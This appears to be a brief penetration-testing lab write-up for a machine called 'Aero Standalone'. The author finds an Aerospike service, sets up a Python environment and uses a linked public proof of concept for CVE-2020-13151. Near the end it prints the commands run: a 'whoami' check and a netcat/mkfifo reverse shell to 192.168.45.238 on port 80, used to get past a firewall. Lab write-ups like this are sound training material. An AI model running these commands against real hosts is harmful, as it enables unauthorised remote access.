# Aero Standalone

I start of with a scan for open ports:

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

I look through all the ports and http pages but don't find anything and end up looking at the wierd 300X ports&#x20;

<figure><img src="../../../../.gitbook/assets/image (201).png" alt=""><figcaption></figcaption></figure>

that seems to be related to our box, but to run this program i need to install a virtual env:

```
sudo apt install python3-venv
python -m venv venv
source venv/bin/activate
```

I had some problems getting the poc to work:

{% embed url="https://b4ny4n.github.io/network-pentest/2020/08/01/cve-2020-13151-poc-aerospike.html" %}

And i got a shell with those commands:

<pre class="language-sh"><code class="lang-sh"><strong>#checking if i have command execution
</strong><strong>python3 cve2020-13151.py --ahost 192.168.127.143 --cmd 'whoami'
</strong><strong>#getting my reverse shell and bypassing firewall using port 80:
</strong>python3 cve2020-13151.py --ahost 192.168.127.143 --cmd 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&#x26;1|nc 192.168.45.238 80 >/tmp/f'
</code></pre>

